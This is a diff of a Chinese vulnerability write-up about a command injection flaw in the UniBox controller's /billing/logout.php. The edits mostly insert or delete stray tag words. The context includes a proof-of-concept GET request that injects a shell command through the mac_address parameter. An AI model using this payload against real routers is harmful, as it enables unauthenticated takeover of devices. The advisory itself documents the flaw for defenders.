@@ -6,7 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-Wifi-soft UniBox controller 路由器产品中存在一个致命[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，`/billing/logout.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。
+Wifi-soft UniBox controller [路由器](#)产品中存在一个致命[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，`/billing/logout.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。
+
+网络设备
 
 # 影响版本
 
@@ -17,6 +19,8 @@ Wifi-soft UniBox controller 路由器产品中存在一个致命[漏洞](https:/
 # 漏洞分析
 
 直接看 `/billing/logout.php` 的业务实现造成[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")的关键部分如下
+
+网络安全
 
 ```
 <?php
@@ -56,19 +60,13 @@ Wifi-soft UniBox controller 路由器产品中存在一个致命[漏洞](https:/
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用
 
 > 支持cookie获取参数，注意检测点，别漏
+>
+> 网络
 
 ```
 GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
 Host: unibox.mrxn.net
 ```
-
-深入探索
-
-数据管理
-
-开放源代码
-
-计算机安全
 
 访问[命令执行](https://mrxn.net/tag/rce "标签：命令执行")结果文件 `/billing/11.txt`
 
